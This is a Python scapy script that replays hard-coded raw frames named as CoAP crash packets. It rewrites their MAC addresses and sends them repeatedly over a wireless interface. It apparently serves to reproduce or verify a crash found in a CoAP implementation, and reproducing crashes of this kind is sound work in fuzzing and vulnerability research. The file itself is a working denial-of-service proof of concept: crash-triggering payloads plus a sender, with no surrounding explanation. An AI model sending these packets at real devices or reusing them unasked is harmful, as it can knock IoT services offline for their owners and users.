import scapy.all as scapy
import time
from binascii import unhexlify

def verify_lst(lst):
    count = 2
    for idx, pkt in enumerate(lst):
        # time.sleep(3)
        print("Packet: ", idx)
        while(count > 1):
            frame = scapy.Ether(unhexlify(pkt))
            frame[scapy.Ether].src ='00:d4:9e:83:48:d9'
            frame[scapy.Ether].dst = 'a8:03:2a:eb:f5:20'
            # pkt[IP].src = "10.42.0.100"
            # pkt[IP].dst = "10.47.0.156"
            
            del frame[scapy.IP].chksum
            del frame[scapy.UDP].chksum
            scapy.sendp(frame,iface = 'wlan0')
            time.sleep(0.5)
            count = count - 1
            print(count)
            # time.sleep(1)
        count = 2

packet_lst_coap_crash1 = [
                    # "ecf1f8d5476becf1f8d5476b08004500004bced240004011568e0a2f00010a2a00e896a4163300371af14803c01eeb1187a07109797ab94573707265737369661100d10208d11410ff68686868686868686868686868686868",
                    "ecf1f8d5476becf1f8d5476b08004500004bced240004011568e0a2f00010a2a00e896a4163300371af14803c01eeb1187a07109797ab94573707265737369661100d10208d15410ff68686868686868686868686868686868",
                    "ecf1f8d5476becf1f8d5476b080045000047d836400040114d2e0a2f00010a2a00e896a416330033484c4803c02a591187a8deb9b733b94573707265737369661100d10200d11410ff686868686868686868686868",
]

count = 1
while(count>0):
    verify_lst(packet_lst_coap_crash1)
    count = count -1
